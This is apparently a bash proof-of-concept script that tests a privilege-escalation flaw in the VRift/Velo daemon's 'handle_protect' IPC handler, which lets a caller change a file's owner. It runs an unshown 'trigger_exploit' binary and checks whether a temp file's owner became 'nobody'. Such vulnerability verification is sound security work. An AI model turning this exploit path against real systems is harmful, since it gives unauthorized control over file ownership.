#!/bin/bash

# Velo Daemon Privilege Escalation POC
# Targets: handle_protect (arbitrary chown)

TARGET_FILE="/tmp/vrift_victim_file"
DAEMON_SOCKET="/tmp/vrift.sock"

echo "--- Daemon Privilege Escalation Verification ---"

# 1. Create a dummy file owned by current user
touch "$TARGET_FILE"
echo "[+] Created victim file: $TARGET_FILE"
ls -l "$TARGET_FILE"

# 2. Check current identity
CURRENT_USER=$(whoami)
echo "[+] Current user: $CURRENT_USER"

# 3. Request daemon to change ownership to 'nobody' (or any other user)
# We use a raw bincode-like payload or the vrift cli if it supports it
# Since we want to prove the IPC vulnerability, we'll try via CLI first

if [ ! -f "./target/debug/vrift" ]; then
    echo "[!] CLI not found. Building..."
    cargo build --package vrift-cli
fi

echo "[+] Attempting to exploit via 'vrift protect' (which uses IPC)..."

# Note: The CLI might not expose the 'owner' field in its 'protect' command, 
# but we can simulate the IPC message if needed.
# Let's check 'vrift protect' help first.
./target/debug/vrift --help 2>&1 | grep -q "protect"
if [ $? -eq 0 ]; then
    # If UI exists, attempt it.
    # Note: VRift CLI doesn't seem to have a standalone 'protect' cmd in help, 
    # it's usually part of ingest. 
    # We will use a custom Rust trigger or a Python IPC script for precise control.
    echo "[!] CLI does not expose 'protect' directly. Using Python IPC trigger..."
fi

# Using cargo built example binary
./target/debug/examples/trigger_exploit

# 4. Check if ownership changed
echo "[+] Checking ownership of $TARGET_FILE..."
ls -l "$TARGET_FILE"

FILE_OWNER=$(ls -l "$TARGET_FILE" | awk '{print $3}')
if [ "$FILE_OWNER" == "nobody" ]; then
    echo "[SUCCESS] Privilege Escalation PROVED! File owner is now 'nobody'."
else
    echo "[INFO] Ownership did not change to 'nobody'. Owner is: $FILE_OWNER"
    echo "[INFO] This might be because the daemon is not running as root or user 'nobody' doesn't exist."
fi

# Cleanup
rm "$TARGET_FILE"
